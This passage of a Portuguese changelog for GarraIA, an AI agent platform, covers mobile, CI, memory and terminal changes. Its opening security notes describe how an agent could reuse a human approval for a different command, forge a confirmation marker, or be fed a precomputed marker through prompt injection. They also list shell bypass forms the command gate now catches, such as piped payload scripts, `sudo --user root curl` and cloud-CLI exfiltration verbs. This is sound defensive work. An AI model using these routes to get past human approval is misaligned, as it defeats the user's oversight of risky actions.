  `curl`/`wget` agora passam pelo tier de confirmacao. No unix, os filhos
  de bash, git_diff, code_review e repo_search herdam apenas
  `PATH/HOME/LANG/LC_ALL/TERM/USER` do processo pai (a politica vive em
  `garraia-common::safety_gate::allowed_child_env`), o bash roda no
  `working_dir` da sessao via `current_dir` e o `git diff` usa
  `--no-ext-diff` contra `.git/config` plantado — o canal de heranca de
  env para segredos do pai esta fechado; leitura direta de
  `/proc/<pid>/environ` por mesmo UID passa pelo tier de risco (padrao
  `environ`), mas so um sandbox real a fecha por completo (follow-up).
  No Windows o scrub fica desligado (PowerShell precisa do proprio
  ambiente).
- A aprovacao humana de um comando de risco passou a valer para O COMANDO
  aprovado, e nao para o turno inteiro. Antes o `ok` do usuario ligava um
  booleano que qualquer tool call daquele turno consumia: o modelo pedia
  confirmacao para um `ls -la`, recebia o `ok`, e executava outra coisa em
  seguida. Cada pedido agora carrega a impressao digital de
  `(ferramenta, assunto)` e a ferramenta so honra a aprovacao que bate com o
  que ela esta prestes a fazer (#1078).
- O marcador de pedido de confirmacao deixou de ser aceito quando vem do
  TEXTO do modelo. Um modelo com saida nao sanitizada escrevia o marcador na
  propria narracao, plantava um pedido que nunca existiu e colhia o `ok`
  inocente do usuario na mensagem seguinte. So resultado de ferramenta cria
  pedido, porque e a ferramenta que o emite (#1078).
- A impressao digital do pedido de confirmacao passou a ser um HMAC com chave
  aleatoria por processo, e nao um hash de entradas publicas. Restringir o
  marcador a resultado de ferramenta fecha o texto do modelo, mas nao fecha o
  resultado de uma ferramenta que devolve conteudo de terceiro: uma pagina
  buscada pelo `web_fetch`, um arquivo lido pelo `file_read`, a resposta de um
  servidor MCP. Com hash simples o atacante pre-computava o marcador de um
  comando escolhido por ele, servia junto de uma injecao de prompt, e colhia o
  "ok" do usuario. Sem a chave, conteudo de terceiro nao cunha marcador que
  bata com comando nenhum (#1078).
- O gate de comandos passou a cobrir os fake-negativos que o #1075 deixou
  documentados como residuo. Script-file num shell ou interpretador
  (`bash payload.sh`, `python3 script.py`, `python3 -m modulo`) e codigo que
  o gate nao consegue ler e agora exige confirmacao, como o `-c` inline ja
  exigia. `xargs -a arquivo curl` deixou de esconder o programa atras do
  caminho do arquivo, e o mesmo defeito atingia `sudo -u root curl`. `awk`
  com `system()` ou pipe para comando, e o `e`/`w` do GNU sed, entram pelo
  script em vez de passarem por ferramenta de texto. `find` com
  `-exec`/`-ok`/`-delete`, `nc`/`ncat` sem flag, e os verbos de exfiltracao
  de `aws`/`az`/`gcloud`/`gsutil` tambem entraram. Nada disso e substring
  novo no DENY_LIST: sao regras por programa, com o script tokenizado com
  aspas respeitadas, e cada uma tem teste do falso positivo que ela nao pode
  causar (#1078).
- Duas portas laterais do mesmo buraco de script-file tambem fecharam:
  `bash < payload.sh` (o `<` e metacaractere, o split partia ali e o segmento
  que sobrava era um shell sem operando) e a forma longa dos flags de wrapper
  que levam valor (`sudo --user root curl` resolvia o programa como `root`, e
  o `curl` nunca era avaliado; so a forma curta `-u` estava coberta) (#1078).

## [0.4.0] - 2026-09-07

Garra Mobile vira produto: a v0.4.0 e a primeira release em que o app
Android (`apps/garraia-mobile`) deixa de ser um cliente da cloud e passa a
ser a interface local-first da ADR 0016 — runtime no proprio aparelho
(Termux), num PC da rede ou no Garra Cloud, com a home do design de
referencia e o APK publicado como asset. O CI ganhou o workflow `mobile.yml`
e o download do Swagger UI foi endurecido em todos os jobs que compilam o
gateway, depois de o E2E cair em `main` no dia do corte da v0.3.9.

### Added
- **Garra Mobile v0.4.0: home local-first e o app deixa de ser so cliente da
  cloud (ADR 0016, amendment 2026-09-07).** `apps/garraia-mobile` ganha o
  design system Garra Neon (Inter + JetBrains Mono bundladas, marca vetorial
  do lobo em `CustomPainter`, sem PNG binario), a home da referencia — header,
  saudacao, dois cards de status alimentados por `GET /api/health`, seis tiles
  (Chat, Memory, Skills, Files, Agents, Automations), Quick Actions e bottom
  nav — e uma camada `lib/runtime/` (`GarraConnection`) com tres modos:
  *On this phone* (Termux em `127.0.0.1:3888`), *Another Garra* (URL na LAN +
  `gateway.api_key` opcional no `flutter_secure_storage`) e *Garra Cloud* (o
  cliente JWT antigo). O onboarding pede nome e runtime e nao exige login nos
  modos local/LAN; o gate do router passou de "tem JWT?" para "tem runtime
  configurado?". Telas novas de Memory, Skills, Files, Agents, Providers,
  Activity, Notifications e Profile consomem so endpoints que o gateway ja
  expoe (`/api/memory/*`, `/api/learning/skills`, `/api/projects`,
  `/api/modes`, `/api/mcp`, `/api/providers`, `/api/sessions`, `/api/logs`).
- **Negociacao de capabilities entre app e gateway.** `GET /api/capabilities`
  passa a anunciar `memory`, `learning-skills`, `projects` e `modes`
  (`capabilities.rs::feature_flags`, aditivo, com teste que trava o contrato); a
  home marca como *Unavailable* qualquer tile cuja feature o runtime nao
  anuncia. `automations` fica ausente de proposito — o gateway nao expoe API
  de scheduling, e o tile diz isso em vez de fingir.
- **APK no CI e na Release.** Workflow `mobile.yml` (`flutter analyze` +
  `flutter test` + APK como artefato em PRs que tocam o app) e job best-effort
  `build-android-apk` no `release.yml` publicando `garraia-mobile-android.apk`
  + `.sha256` — asset aditivo, nada que o `garra update` resolve muda.
  Assinado com os secrets `ANDROID_KEYSTORE_*` quando existirem, senao com a
  keystore de debug do runner (o job avisa com `::warning::`).

### Changed
- **Garra Mobile migra para Riverpod 3 (`riverpod_generator` 4) e sobe
  `record` para 6.2.1.** O `riverpod_generator` 2.6.x prendia o `analyzer` na
  linguagem 3.9 e a codegen morria em Dart >= 3.13 com `Missing implementation
  of visitDotShorthandPropertyAccess`; `custom_lint` e `riverpod_lint` sairam
  (contradizem-se em `analyzer_plugin`; `flutter_lints` segue como gate). O
  `record` 5.1.2 resolvia `record_web` e `record_platform_interface`
  incompativeis e quebrava `flutter build web`. Flutter fixado em 3.47.2 no
  CI e o `pubspec.lock` reresolvido contra ele. A versao do app passa a ter
  fonte unica (`lib/app_version.dart`, com teste contra o `pubspec.yaml`) —
  antes havia tres (`0.2.1+2`, `v0.1.0 (Alpha)` na tela de Settings, `0.1.0`
  no sync).
- **Download do Swagger UI endurecido em todo job que compila o gateway
  (GAR-822, segunda rodada).** O `build.rs` do `utoipa-swagger-ui` baixa o
  zip em tempo de compilacao e de vez em quando recebe corpo truncado
  (`InvalidArchive("Could not find EOCD")`); o fix anterior cobria so `test` e
  `msrv`, e em 2026-09-07 foi o job E2E que caiu em `main`. Um composite
  action (`.github/actions/swagger-ui-cache`) pre-baixa com retry, verifica
  que o arquivo e um zip valido mesmo em cache hit, e e usado em `clippy`,
  `coverage`, `build`, `android`, `e2e`, `playwright`, `test`, `msrv` e em
  todos os jobs de build do `release.yml` — inclusive o `cross` do
  linux-arm64, via zip dentro do workspace e `passthrough` no `Cross.toml`.

### Fixed
- **Garra Mobile: transcricao de voz apontava para um endpoint que nao
  existe.** O app chamava `POST /api/voice/transcribe`; o gateway expoe
  `POST /api/stt` (`voice_handler.rs`). Corrigido no cliente cloud e na
  `GatewayConnection`.
- **Garra Mobile: o build Android so funcionava numa maquina.**
  `android/gradle.properties` fixava `org.gradle.java.home=C:/Program
  Files/Java/jdk-23`, o que derrubava qualquer build Linux/macOS/CI antes de
  o Gradle iniciar. Removido (o JDK vem de `JAVA_HOME`). No mesmo passe:
  `MainActivity` passa a estender `FlutterFragmentActivity` (exigencia do
  `local_auth`), o splash deixa de ser branco num app que so tem tema escuro,
  as permissoes que os plugins declarados exigem (`RECORD_AUDIO`, `CAMERA`,
  `POST_NOTIFICATIONS`, `USE_BIOMETRIC`, `ACCESS_NETWORK_STATE`) entram no
  manifest, e os deep links `garraia://chat/<id>` e `garraia://session/<id>`
  que o router ja tratava ganham o intent-filter que faltava.
- **Os documentos da raiz contradiziam o produto em cinco pontos, conferidos
  contra o binario e o codigo.** Os dois READMEs diziam que um subcomando
  `garra memory` "esta no roadmap" — ele existe desde o #950/#953, com dez
  subcomandos, e ganhou o `add` no #958. O `README.pt-BR` ainda atribuia a API
  do gateway operacoes de "adicionar" e "exportar" que ela nao tem: as rotas
  reais sao `GET /api/memory/recent`, `GET /api/memory/search` e
  `DELETE /api/memory`, tres e nao cinco.
- **O `AGENTS.md` declarava `rust-version = "1.94"`;** o `Cargo.toml` diz
  `1.95`. E mandava rodar `cargo test --workspace` sem excluir o
  `garraia-desktop`, cujo `build.rs` precisa de GTK/glib e de um sidecar do
  Windows que uma maquina limpa nao tem — seguir o arquivo ao pe da letra
  falhava em algo que nao era a mudanca de quem seguia. O `CONTRIBUTING.md`
  repetia o mesmo comando.
- **O `CONTRIBUTING.md` nao mencionava o `changelog.d/`,** que e obrigatorio em
  todo PR desde o #973 e existe justamente para dois PRs paralelos nao
  colidirem na secao `[Unreleased]`. Ganhou passo proprio, com a razao junto.
- A tabela de "Politicas de Ferramentas" dos modos era **aspiracional** ate a
  v0.3.9: a `ToolPolicy` era declarada e nunca verificada no executor (#988).
  Os dois READMEs agora dizem desde quando ela vale, e o que valia antes.
- `ROADMAP.md` e `TODO.md` reancorados na v0.3.9 e em zero issues abertas; o
  `CLAUDE.md` registra o invariante novo do corpo de release e a armadilha de
  `.gitignore` sem ancora que engoliu o `scripts/release/notes.py`.
- **O titulo do README voltou a ser um `<h1>`.** O #1021 fechou o seletor de
  idioma como `</p` sem o `>`, e o tokenizador HTML, ao procurar o fim daquela
  tag, engolia o `<h1 align="center">` inteiro da linha seguinte: "GarraIA"
  passava a ser texto solto e sem centralizacao na capa do repositorio. Um
  caractere devolvido; a remocao do logo, que foi decisao do #1021, fica.
- **O `deep-research-report.md` renderizava 98 blocos de lixo.** O documento
  entrou no repositorio em 2026-04-13 com os marcadores internos de citacao da
  ferramenta que o gerou ainda embutidos — sequencias delimitadas por
  caracteres da Private Use Area do Unicode (U+E200/E201/E202), que o GitHub
  desenha como tofu e nenhum leitor consegue seguir: `turn1search3` referencia
  um resultado de busca efemero da sessao que produziu o texto, morto desde
  entao. Eram 93 marcadores de citacao, removidos.
- Os outros 5 marcadores eram de tipo diferente e **envolviam texto de
  verdade**: apagar os spans sem olhar teria excluido as palavras `Brasil`,
  `ANPD`, `Uniao Europeia`, `NIST` e `European Data Protection Board` das
  frases em que aparecem. Foram substituidos pelo nome de exibicao. A
  conferencia foi por palavra: 5066 antes, 5066 depois, zero diferencas.
- O relatorio ganhou um **cabecalho de contexto** que ele nunca teve. Nao tinha
  data nem status, e o `CLAUDE.md` o importa como "base arquitetural da Fase
  3" — o que convidava a ler como especificacao viva uma pesquisa de abril. O
  cabecalho diz o que ele e, de quando e, que o ADR vence onde divergirem, e
  quais dos "itens nao especificados" ja foram decididos (ADR 0003, 0004 e
  0005).
- **Sete links relativos apontavam para arquivos que nao existem.** Cinco eram
  para `benches/database-poc/`, o PoC removido em 2026-08-16 pelo #814 — que
  ja tinha estabelecido o tratamento ("links mortos viram mencao historica"),
  mas corrigiu README e ROADMAP e deixou passar o ADR 0003, onde estava a
  maioria deles. A tabela B1-B5 continua reproduzida no proprio ADR, entao
  nenhum numero se perdeu; os arquivos seguem recuperaveis em `2188751^`.
- Os outros dois eram do ADR 0009, para `plans/0116a-*` e `plans/0116b-*`.
  Conferido: esses planos **nunca existiram** em ponto nenhum da historia do
  repositorio. Viraram nome de registro, com ponteiro para o plano que existe.
- `docs/src/SUMMARY.md`, o indice do mdBook, mandava para `./installation.md`
  e `./configuration.md`; os dois arquivos vivem em `docs/`, nao em
  `docs/src/`. As paginas "Instalacao" e "Configuracao" do livro sairiam
  vazias. Corrigido para `../`, que e o que o proprio SUMMARY ja usa para a
  persona da Hera. Mesmo erro em `docs/src/continue-modes.md`.

### Security
- **Garra Mobile: cleartext deixa de ser global e o cloud passa a exigir
  HTTPS.** `android:usesCleartextTraffic="true"` foi trocado por um
  `network_security_config.xml`: HTTP continua permitido na base — o runtime
  local-first e `http://127.0.0.1` ou `http://192.168.x.x`, e o Android nao
  aceita faixas CIDR em `domain-config` — mas `garraia.org` e subdominios
  ficam `cleartextTrafficPermitted="false"`, entao um `http://` acidental
  para o cloud falha em vez de rebaixar em silencio. A `gateway.api_key` do
  modo LAN vive so no `flutter_secure_storage` (teste garante que nunca cai
  em `SharedPreferences`), e chaves de provider continuam no runtime, nunca
  no telefone — enquanto o runtime for outro app (UID do Termux != UID do
  app), o Keystore do app nao alcanca o cofre do Garra.
- **Garra Mobile: backup do Android desligado e cookie de sessao so onde
  faz sentido.** `android:allowBackup="false"` no manifesto — as
  `SharedPreferences` guardam a URL do runtime e o `session_id` do gateway,
  e o auto-backup / `adb backup` os copiaria para fora do aparelho sem ganho
  nenhum (refazer o onboarding leva trinta segundos). A `CloudConnection`
  deixa de herdar o replay do cookie `garraia_session`: no cloud a unica
  credencial e o JWT e `POST /api/sessions` nunca e chamado, entao um cookie
  ali so poderia ter sido plantado por uma resposta hostil. O onboarding
  avisa quando o endereco LAN e `http://` puro, e a fila offline passou a
  falar com o runtime diretamente (sessao persistida) em vez de acordar o
  notifier do chat, que e autoDispose e pode nao existir sem tela aberta.

## [0.3.9] - 2026-09-07

A v0.3.9 foi preparada em 2026-09-05 e nunca chegou a ser publicada — nao
houve tag. O que estava pronto naquele dia ficou, e o que entrou depois entrou
junto: esta secao e a soma das duas coisas.

**O que ja estava pronto em 05/09.** Dois lotes de retorno de campo do mesmo
usuario da v0.3.6/v0.3.7 (Samsung A16 / Android 13 / Termux, com o Garra
orquestrado pelo Hermes via MCP): issues #920-#925 (PRs #926/#927/#931/#932) e
#928-#930 (#945/#946), mais a persona da Hera (#966). Como nos lotes
anteriores, a verificacao mudou o diagnostico da maioria dos relatos — o
detalhe esta no corpo de cada PR — e achou um bug de seguranca que ninguem
reportou (#945).

**O que entrou de 05/09 a 07/09.** 48 issues e PRs, de #933 a #1012, em tres
frentes:

- **Trilha B — Garra Terminal UX v2** (epico #944, fechado): eventos de
  ferramenta visiveis no terminal, Markdown renderizado sem parar o streaming,
  superficies de status (`/status`, `/tools`, `/logs`), `garra logs`, e o fim
  da cor incondicional — `garra chat 2>/dev/null | cat` nao carrega mais
  escape ANSI.
- **Trilha C — memoria semantica** (#948-#965): isolamento de tenant no
  caminho KNN, embeddings confiaveis, `garra memory` com `add`/`reindex`/
  `backup`/`pin`/`ttl`, retencao, metricas, e um benchmark de qualidade de
  recall em portugues.
- **Bloco de modos** (#979-#988): a `ToolPolicy` era declarada e **nunca
  verificada no executor** — modos anunciados como somente-leitura nao
  bloqueavam `file_write` nem `bash`, so pediam no prompt. Agora a politica
  vale na execucao.

**O padrao que atravessa o lote** e uma classe so de defeito: *restricao
declarada que ninguem aplica*. A `ToolPolicy` dos modos (#988), o `tools:` de
agente nomeado que o A2A ignorava (#965), o `X-User-Id` que decidia identidade
numa rota sem auth (#1012), o `continuity_key(_user_id)` que sugeria escopo por
pessoa e devolvia um barramento global. Cada um prometia uma propriedade que o
codigo nao entregava.

Junto vieram tres documentos que contradiziam o binario, corrigidos ao serem
conferidos contra ele: o `retriever` (#964), o `docs/src/memory.md` (#963) e a
pagina `docs/memory.md`, para onde o wiki do projeto aponta duas vezes e que
ainda descrevia comandos inexistentes.

### Added

- **`IntegrityReport.entries_missing_model` e o teste de dimensao divergente
  fecham a #960.** O contador conta entradas COM vetor e SEM
  `embedding_model` — o legado de antes do #954, que perde o eixo semantico
  (0.7 do score) sempre que o recall chega com modelo definido, sem nenhum
  aviso no caminho SQL; um `debug!` por recall complementa, contando os
  candidatos rebaixados por modelo divergente. A reindexacao (#953) zera essa
  fila. O teste novo garante que vetor de tamanho diferente do da tabela nao
  entra e que a recusa nao deixa rastro no `vec_id_map` — com ele, os quatro
  testes de integridade que a issue propos estao no lugar (os outros tres
  vieram no #971).
- **`MemoryStore::integrity_report()` (#960).** Conta entradas com/sem
  embedding (a fila de reindexacao do #953), linhas por tabela vetorial e
  mapeamentos orfaos — a verificacao que em 2026-09-05 precisou de script
  externo (7.101 entradas vs vetores) vira uma chamada. Base do futuro
  `garra memory stats` (#950). `in_memory_with_vectors()` liga o caminho KNN
  em testes; 7 testes novos cobrem isolamento, mistura de modelos, orfaos e
  idempotencia da delecao.
- **Health check do provider de embeddings no boot (#951).** O
  `health_check()` existia no trait desde sempre e **nunca era chamado**: o
  boot logava "configured ollama embedding provider" e seguia, mesmo com o
  Ollama desligado. Agora o boot pergunta e avisa alto quando nao ha resposta,
  dizendo o que vai acontecer (memorias novas sem vetor, recall textual) e o
  que fazer depois (reindexar). Avisa, nao derruba: memoria semantica e
  opcional, e recusar subir por causa dela deixaria o usuario sem chat nenhum.
  `AgentRuntime::embedding_provider()` expoe o provider ativo — a mesma porta
  que a reindexacao da CLI (#953) vai usar.
- **O terminal mostra o que o agente esta fazendo, ferramenta por ferramenta
  (#937).** Ate aqui a execucao de ferramenta era invisivel no `garra chat`:
  o usuario via o indicador de atividade e, minutos depois, a resposta pronta —
  sem saber se o agente estava lendo um arquivo, rodando `cargo test` ou parado.
  Agora cada chamada aparece em duas linhas compactas: `● Bash cargo test` ao
  comecar e `└─ 148 passed · 6.3s` ao terminar, com glifo e cor diferentes na
  falha (`× Bash └─ error: exit 101 · 4.2s`). Saida longa **nao** e despejada:
  vira a primeira linha mais a contagem das outras.

  Por baixo, o `garraia-agents` ganha `TurnEvent` e `TurnSink`. O runtime
  passa a contar o turno inteiro — texto e ciclo de vida de ferramenta — num
  canal so, o que preserva a ordem entre os dois (dois canais nao garantiriam,
  e o agente intercala texto e ferramenta no mesmo turno). Os sete consumidores
  que so querem texto — Telegram, Slack, Discord, WhatsApp, `openai_api`,
  `parrot_ws` e o `garra ask` — ficam intactos: num sink de texto os eventos de
  ferramenta sao descartados na origem.

  O resumo do input e o do output passam por `redact_secrets` **antes** de
  virar evento, e nao no renderer: qualquer consumidor futuro herda a garantia
  sem precisar lembrar dela.

- **O indicador de atividade volta depois que a ferramenta termina (#937).**
  Ele parava no primeiro token e nao voltava mais, entao o tempo em que o
  modelo pensa **depois** de uma ferramenta era prompt morto de novo. Faltava
  o evento para ouvir; agora existe. O rotulo `Garra` continua saindo uma vez
  so por turno.

- **O redactor de segredos aprendeu os segredos de terceiro (#937).** Ate aqui
  ele so via log, onde aparecem as chaves que o proprio GarraIA usa — Anthropic,
  OpenAI, Slack, Discord. Com os eventos de ferramenta ele passou a ver
  **comando que o agente monta**, e ali entra credencial que o usuario deu no
  contexto. Foram acrescentados: PAT do GitHub (classico e fine-grained), JWT,
  access key da AWS (fixa e temporaria), token de bot do Telegram e senha
  embutida em connection string (`postgres://user:senha@host`). Como o
  `redact_secrets` e o mesmo que o `RedactingWriter` usa, todo log do projeto
  ganhou a cobertura junto. O que ele continua **nao** cobrindo, e esta escrito
  no codigo: segredo sem formato reconhecivel, como `--password minhasenha` —
  um regex que tentasse pegar "o argumento depois de --password" erraria mais
  do que acertaria.
- **`/tool` mostra a saida inteira de uma chamada de ferramenta (#938).** O
  #937 reduziu cada chamada a uma linha, o que deixou a conversa legivel — mas
  resumo bom e resumo que esconde coisa, e esconder sem dar como reaver e so
  perder: quando o `cargo test` diz "Failed" e o resumo mostra a primeira
  linha, a causa costuma estar na linha 300. Agora cada linha de ferramenta
  termina com um numero (`#7`) e `/tool 7` mostra a saida completa; `/tool`
  sozinho lista o que esta guardado. O numero e curto de proposito porque
  aparece em toda linha, e ele existe porque sem ele o `/tool <n>` do `/help`
  seria instrucao sem como ser seguida.
- **Indices nao sao reusados.** Numerar por posicao faria `/tool 3` significar
  coisas diferentes conforme outras chamadas acontecessem — o usuario le "3" na
  tela, roda mais um comando e recebe outra saida sem nada indicando a troca.
  Sao monotonicos, e pedir uma entrada ja descartada diz que ela expirou em vez
  de mostrar a errada. "Expirou" e "nunca existiu" sao mensagens diferentes: a
  primeira e acionavel (rode de novo), a segunda quer dizer que o numero esta
  errado.
- **Dois limites, nao um.** O registro guarda as 20 ultimas chamadas E no
  maximo 512 KiB. So o teto de entradas nao seguraria memoria (vinte saidas de
  64 KiB sao 1,2 MiB grudados no processo); so o teto de bytes tornaria o
  `/tool` imprevisivel, porque uma saida gorda expulsaria dez pequenas e o
  indice recem-visto sumiria. Cada saida e capada em 64 KiB **na origem**, no
  `garraia-agents`, preservando comeco e fim com marcador do que sumiu — so o
  fim perderia o que estava sendo compilado, so o comeco perderia a causa da
  falha.
- **A saida completa passa pelas mesmas garantias do resumo**: redacao de
  segredo e remocao de controle de terminal (#995), na origem. Era criterio de
  aceite explicito da issue e daria para errar, porque o resumo ja era seguro e
  dava para achar que a saida crua tambem era. A diferenca e so de forma —
  quebra de linha e tabulacao sobrevivem, porque sao a estrutura do texto que o
  usuario pediu para ler; o `\r` nao sobrevive, porque sozinho ele devolve o
  cursor ao inicio da linha e e a primitiva de sobrescrever texto ja impresso —
  mas na saida completa ele vira **quebra de linha** em vez de sumir, senao uma
  barra de progresso (`10%\r20%\r100%`) viraria `10%20%100%`, um amontoado que
  o leitor nao distingue de uma saida que era assim mesmo. Idem backspace,
  tabulacao vertical e form feed, que viram marcador visivel.
- **A resposta do modelo passa a sair formatada no terminal (#939).** Titulo,
  negrito, enfase, codigo inline, bloco cercado, lista com marcador ou numero,
  citacao, link e regra horizontal saem renderizados em vez de com a sintaxe
  crua na tela.
- **Sem bufferizar por linha, que era a solucao obvia e errada.** Renderizar a
  linha inteira quando ela fecha da resultado perfeito e zero cintilacao — e
  para a prosa: o modelo costuma emitir um paragrafo inteiro como uma unica
  linha, entao o usuario ficaria olhando para o nada ate o ponto final.
  Streaming que nao aparece nao e streaming. O renderizador segura so o que
  ainda pode mudar de significado: poucos caracteres no inicio da linha para
  decidir o tipo de bloco, e depois a cauda a partir do ultimo delimitador
  inline ainda sem par. O atraso maximo e de uma palavra.
- **Um construto partido entre dois deltas continua sendo um construto.** E a
  mesma classe de problema do filtro ANSI (#996) e tem a mesma forma de
  solucao — estado que atravessa as chamadas. O teste que importa renderiza
  cada exemplo em **todo** tamanho de pedaco possivel, e nao num corte
  escolhido a dedo: o corte que o autor imagina e justamente o que nao quebra.
- **A prosa quebra na largura do terminal, e a continuacao recebe o recuo do
  bloco.** E esse alinhamento que justifica quebrar: o terminal ja quebra
  sozinho no limite direito, mas sempre na coluna zero, e a segunda linha de um
  item de lista passava a parecer um item novo. Quem mede e
  `console::measure_text_width`, que ignora escape e conta largura visual —
  contar bytes erraria com acento e com ideograma.
- **Bloco cercado nao ganha estilo inline nem quebra.** O criterio de aceite
  pede que codigo continue facil de copiar: um `*` no meio de um programa e um
  `*`, e um `\n` que o modelo nao escreveu vira um `\n` que o usuario cola.
  Linha longa de codigo passa a decisao ao terminal. Pela mesma razao, um bloco
  unico maior que a linha inteira (URL longa, base64) sai sem quebra inventada.
- **Sem cor, nada disto acontece — nem um escape.** Saida redirecionada,
  `NO_COLOR` ou `TERM=dumb` devolvem o texto exatamente como veio, byte a byte,
  que e o que mantem `garra chat > arquivo` util para automacao. O `garra ask`
  fica de fora por contrato proprio ja escrito no codigo: ele nunca imprime
  ANSI no stdout.
- **Tres limites que a auditoria pediu, e um pânico que ela achou.** Acento
  como primeiro caractere de uma linha dentro de bloco cercado derrubava o CLI
  — o ramo que decide se a linha e a cerca de fechamento fatiava o primeiro
  **byte**, e num `é` esse byte nao e fronteira de caractere. Alem disso: o que
  fica retido esperando um delimitador fechar tem teto (um `**` sem par numa
  resposta sem quebra de linha segurava a tela e o buffer crescia junto), a
  linha e compactada enquanto sai (uma resposta de uma linha so ficava inteira
  em memoria), e o estilo de titulo ou citacao e fechado no fim do turno mesmo
  sem o `\n` final — antes um turno truncado deixava o proximo prompt em
  negrito.
- **`/status` e `/tools` novos, e `/context` legivel (#940).** O `/status` diz
  provider, modelo, ferramentas, sessao e o que o ultimo turno de fato usou —
  sempre o valor **vivo**: o `/model` troca o modelo no meio da sessao, entao
  ler a config diria o que era verdade no boot. O `/tools` responde "quais
  ferramentas o agente tem", que ate aqui nao dava para perguntar: `/tools` era
  apelido de `/tool`, que mostra o que elas **produziram**.
- **As superficies pararam de escrever cor incondicional.** `/help`,
  `/context`, `/tool`, `/history`, `/models` e a despedida usavam
  `println!("{DIM}...{RESET}")`, entao `garra chat | cat` carregava escape.
  Medido no binario: **12 sequencias de escape numa sessao de seis comandos
  redirecionada, agora zero.** E a divida que a ADR 0017 registra, paga onde
  ela mais aparecia.
- **Um painel e uma lista, com a mesma moldura.** Vale a regra do cartao de
  erro: quem sabe **o que** mostrar e o `chat.rs`, quem sabe **como desenhar**
  e a interface. Sendo funcao pura de `(titulo, linhas, estilo, largura)` para
  `String`, "respeita `NO_COLOR`", "cabe no terminal estreito" e "alinha a
  continuacao" viram assercao sobre um valor de retorno, sem terminal e sem
  processo.
- **O `/help` nao pode mais divergir do que existe** — e ele ja divergia: nao
  citava `/models`, e prometia `/provider <nome>` como se trocasse de provider
  (ele responde "reinicie"). Os comandos viraram uma tabela, e um teste confere
  os dois sentidos contra o proprio fonte: comando anunciado que nao existe, e
  comando que existe sem ser anunciado, param no CI.
- **Sem contagem de arquivos no `/context`**, ao contrario do exemplo da issue.
  A propria issue pede para nao varrer o diretorio so para desenhar status, e
  num repositorio grande a varredura custa mais que todo o resto do comando. O
  `/context` tambem deixou de despejar quinze nomes de arquivo no campo
  "Projeto": aquela listagem existe para o prompt do sistema, onde e util ao
  modelo, e nao para quem digitou o comando querendo uma linha.
- **Valor sem espaco maior que a largura estoura, e nao e truncado.** Um
  caminho e um nome de ramo nao tem onde quebrar, e cortar com reticencia
  destruiria justamente o que se copia do painel — quem quebra e o terminal.
- **ADR 0017: camada de apresentacao do CLI (`UiEvent` + `TerminalRenderer`).**
  Formaliza a Fase 2 do epico #944 antes do codigo, como manda a regra absoluta
  8. Registra onde a camada mora (`garraia-cli`, nunca `garraia-agents`), o que
  o renderer possui e o que nao possui — o relogio continua vindo do
  `select!`, e `tracing` nao vira interface —, e quatro invariantes: o renderer
  e chamado de dentro do `select!` e nunca de uma task propria (e o que protege
  a drenagem do canal limitado que ja derrubou o `garra chat` uma vez), todo
  caminho de desenho aceita `impl io::Write` para ser afirmavel em teste, o
  cursor nunca e escondido, e nao-TTY nao emite escape algum. Rejeita
  explicitamente um TUI de tela cheia: ele quebraria scrollback e pipe, que sao
  o modo normal de usar uma CLI de conversa em fluxo.
- **`garra logs` e `garra logs --follow` (#943).** Le o arquivo canonico
  (`garraia.log`, no diretorio de config) direto do disco: **nao fala com o
  gateway** e nao pede que ele esteja rodando — que e justamente quando o log
  importa. `-n/--lines` escolhe quantas linhas do fim (100 por padrao) e
  `--path` imprime so o caminho, para encadear com outro comando.
- **A redacao continua sendo da escrita, e o comando nao a repete.** O
  `RedactingMakeWriter` envolve o appender, entao o que esta no disco ja esta
  redigido. Redigir de novo na leitura mascararia um vazamento em vez de
  conserta-lo: quem abrisse o arquivo no `less` veria o segredo do mesmo jeito,
  e nos acharíamos que estamos protegidos. Ha teste afirmando que o comando
  devolve o byte que leu.
- **`Ctrl+C` no `--follow` sai limpo, com codigo 130** — a convencao do shell,
  a mesma que o `garra chat` ocioso ja seguia, e a mesma do `tail -f` e do
  `journalctl -f`.
- **Log ausente nao e erro.** E o estado normal de quem nunca rodou nada, e a
  mensagem diz onde o arquivo estaria e o que o cria.
- **`/logs` no chat diz onde o log esta, e nao o despeja na conversa.**
  Misturar centenas de linhas de log com a conversa e o oposto do que a Fase 2
  deste epico foi fazer, e seguir o arquivo em tempo real disputaria a mesma
  tela com o streaming da resposta.
- **Sem `--level`, com o motivo escrito.** Uma entrada de log ocupa varias
  linhas quando carrega backtrace, e filtrar linha a linha partiria a entrada
  ao meio — sobraria a primeira linha do erro sem o rastro que a explica. Quem
  quer menos ruido tem o `RUST_LOG`, que decide na escrita.
- **`-n 0` mostra nada, que e o idioma do `tail`** e o par natural do
  `--follow` ("so o que vier daqui em diante"). Ele fazia o oposto: o buffer
  circular nunca podava e o arquivo **inteiro** ia para a memoria e para a
  tela. Num log de 1 GB, um OOM com uma flag. Achado rodando o binario e
  confirmado na auditoria.
- **Linha maior que 1 MiB e pulada.** `BufReader::lines()` nao tem limite: um
  arquivo binario ou sem quebra de linha viraria uma alocacao do tamanho do
  arquivo. Log de texto nao tem linha assim; o que tem e arquivo corrompido.
- **`garra memory` inspeciona, repara e limpa a memoria semantica (#950, #953).**
  Ate aqui a memoria era caixa-preta: nao havia como saber quantas entradas
  existiam, quantas tinham vetor, se o indice estava consistente, nem como
  consertar as que a cadeia de perda silenciosa (#948, #951, #962) deixou sem
  embedding — e o `docs/src/memory.md` chegava a documentar seis subcomandos
  que nunca existiram. Agora sao seis de verdade: `stats` mostra o relatorio de
  integridade do #960 (inclusive a fila legada de vetor sem modelo), `list`
  lista as entradas recentes ou so a fila de reindexacao, `search` roda o mesmo
  recall do agente e diz se foi semantico ou textual, `reindex` reprocessa as
  entradas gravadas sem vetor, `delete` apaga uma entrada com o vetor dela e
  `compact` apaga tudo anterior a N dias. Os dois destrutivos exigem confirmacao
  e, sem terminal, exigem `--yes` explicito. `stats`, `list`, `search` e
  `reindex` tem `--json` para script. O reindex para no primeiro lote que falha
  em vez de insistir: a fila e derivada do banco, entao rodar de novo depois
  continua de onde parou. A CLI abre o **mesmo** `memory.db` do gateway
  (`AppConfig::memory_db_path`, agora fonte unica) e pede o **mesmo** provider
  de embeddings (`bootstrap::build_embedding_provider`, extraido de
  `build_agent_runtime`) — o que o `reindex` grava e exatamente o que o recall
  do agente le de volta.

- **`garra memory reindex` tambem repara o indice, sem custo de provider (#950).**
  O `remember_sync` grava a linha e insere no indice em best-effort: com o
  sqlite-vec fora do ar por um momento, a entrada fica com vetor na coluna e
  **fora** da busca semantica, e o reindex normal nao a alcanca porque ele
  procura `embedding IS NULL`. O reparo agora roda antes, sem chamar provider
